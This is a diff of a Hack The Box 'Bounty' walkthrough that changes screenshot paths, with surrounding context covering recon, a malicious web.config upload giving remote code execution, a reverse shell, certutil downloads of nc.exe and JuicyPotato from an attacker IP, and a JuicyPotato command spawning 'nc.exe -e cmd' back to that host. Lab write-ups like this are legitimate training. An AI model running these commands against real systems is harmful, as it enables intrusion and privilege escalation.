@@ -37,7 +37,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.10.93
 ```
 
-![ping](GitHubv2/HackTheBox/EASY/Bounty/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -57,7 +57,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](GitHubv2/HackTheBox/EASY/Bounty/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -65,7 +65,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](GitHubv2/HackTheBox/EASY/Bounty/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -86,7 +86,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![targeted](GitHubv2/HackTheBox/EASY/Bounty/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -105,7 +105,7 @@ We first identify the web technology using **WhatWeb**:
 whatweb http://10.10.10.93
 ```
 
-![whatweb](GitHubv2/HackTheBox/EASY/Bounty/screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 The server runs **ASP.NET**, meaning valid file extensions will likely be `.aspx`.
 
@@ -115,11 +115,11 @@ We also try the `http-enum` script from Nmap:
 nmap --script http-enum -p80 10.10.10.93 -oN webScan
 ```
 
-![webscan](GitHubv2/HackTheBox/EASY/Bounty/screenshots/webscan.png)
+![webscan](screenshots/webscan.png)
 
 No useful results were found. Let’s manually browse the site:
 
-![web](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web.png)
+![web](screenshots/web.png)
 
 The site only shows a static image of Merlin.
 
@@ -131,7 +131,7 @@ Using **wfuzz** with SecLists dictionary let’s try fuzzing for `.aspx` files:
 wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
 ```
 
-![wfuzz_aspx](GitHubv2/HackTheBox/EASY/Bounty/screenshots/wfuzz_aspx.png)
+![wfuzz_aspx](screenshots/wfuzz_aspx.png)
 
 We discover **transfer.aspx**.
 
@@ -139,16 +139,16 @@ We discover **transfer.aspx**.
 
 Accessing `transfer.aspx` reveals a file upload form:
 
-![web_transfer](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_transfer.png)
+![web_transfer](screenshots/web_transfer.png)
 
 Testing with a simple file (`test.py`) fails:
 
-![web_transfer_test](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_transfer_test.png)
-![web_transfer_test_failed](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_transfer_test_failed.png)
+![web_transfer_test](screenshots/web_transfer_test.png)
+![web_transfer_test_failed](screenshots/web_transfer_test_failed.png)
 
 We need to identify valid extensions. A custom Python script was used to fuzz valid upload extensions:
 
-![fuzzing_extension](GitHubv2/HackTheBox/EASY/Bounty/screenshots/fuzzing_extension.png)
+![fuzzing_extension](screenshots/fuzzing_extension.png)
 
 The most interesting is **`.config`**.
 
@@ -185,12 +185,12 @@ Response.write(1+2)
 -->
 ```
 
-![web_config_3](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_config_3.png)
+![web_config_3](screenshots/web_config_3.png)
 
 Upload it:
 
-![web_transfer_webconfig](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_transfer_webconfig.png)
-![web_transfer_webconfig_true](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_transfer_webconfig_true.png)
+![web_transfer_webconfig](screenshots/web_transfer_webconfig.png)
+![web_transfer_webconfig_true](screenshots/web_transfer_webconfig_true.png)
 
 ### 3.2 Finding Upload Location
 
@@ -201,15 +201,15 @@ cat /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | gr
 wfuzz -c --hc=404 -t 200 -w dictionary http://10.10.10.93/FUZZ
 ```
 
-![wfuzz_uploadedfiles](GitHubv2/HackTheBox/EASY/Bounty/screenshots/wfuzz_uploadedfiles.png)
+![wfuzz_uploadedfiles](screenshots/wfuzz_uploadedfiles.png)
 
 The directory is `/uploadedFiles/`.
 
-![web_uploadedfiles](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_uploadedfiles.png)
+![web_uploadedfiles](screenshots/web_uploadedfiles.png)
 
 Accessing `uploadedFiles/web.config` shows output, confirming **RCE**:
 
-![web_3](GitHubv2/HackTheBox/EASY/Bounty/screenshots/web_3.png)
+![web_3](screenshots/web_3.png)
 
 ### 3.3 Remote Command Execution
 
@@ -224,7 +224,7 @@ Response.write(output)
 %>
 ```
 
-![webconfig_ping](GitHubv2/HackTheBox/EASY/Bounty/screenshots/webconfig_ping.png)
+![webconfig_ping](screenshots/webconfig_ping.png)
 
 Listening with tcpdump:
 
@@ -232,7 +232,7 @@ Listening with tcpdump:
 tcpdump -i tun0 icmp -n
 ```
 
-![webconfig_ping_received](GitHubv2/HackTheBox/EASY/Bounty/screenshots/webconfig_ping_received.png)
+![webconfig_ping_received](screenshots/webconfig_ping_received.png)
 
 ✅ Confirmed RCE.
 
@@ -255,7 +255,7 @@ Response.write(output)
 %>
 ```
 
-![webconfig_shell](GitHubv2/HackTheBox/EASY/Bounty/screenshots/webconfig_shell.png)
+![webconfig_shell](screenshots/webconfig_shell.png)
 
 Start listener:
 
@@ -265,7 +265,7 @@ nc -nlvp 443
 
 Upload and trigger the payload:
 
-![shell_received](GitHubv2/HackTheBox/EASY/Bounty/screenshots/shell_received.png)
+![shell_received](screenshots/shell_received.png)
 
 ✅ Reverse shell obtained as `merlin`.
 
@@ -280,7 +280,7 @@ The flag is hidden but retrievable with:
 dir -Force
 ```
 
-![user_flag](GitHubv2/HackTheBox/EASY/Bounty/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -293,7 +293,7 @@ Check privileges:
 whoami /priv
 ```
 
-![user_priv](GitHubv2/HackTheBox/EASY/Bounty/screenshots/user_priv.png)
+![user_priv](screenshots/user_priv.png)
 
 We have **SeImpersonatePrivilege**.
 
@@ -305,7 +305,7 @@ certutil.exe -f -urlcache -split http://10.10.14.7:80/nc.exe
 certutil.exe -f -urlcache -split http://10.10.14.7:80/JP.exe
 ```
 
-![nc_&_JP_uploaded](GitHubv2/HackTheBox/EASY/Bounty/screenshots/nc_&_JP_uploaded.png)
+![nc_&_JP_uploaded](screenshots/nc_&_JP_uploaded.png)
 
 Start listener:
 
@@ -319,11 +319,11 @@ Execute JuicyPotato:
 .\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.7 4646"
 ```
 
-![executing_JP](GitHubv2/HackTheBox/EASY/Bounty/screenshots/executing_JP.png)
+![executing_JP](screenshots/executing_JP.png)
 
 ### 4.3 Root Flag
 
-![root_flag](GitHubv2/HackTheBox/EASY/Bounty/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 **Root flag obtained**
 
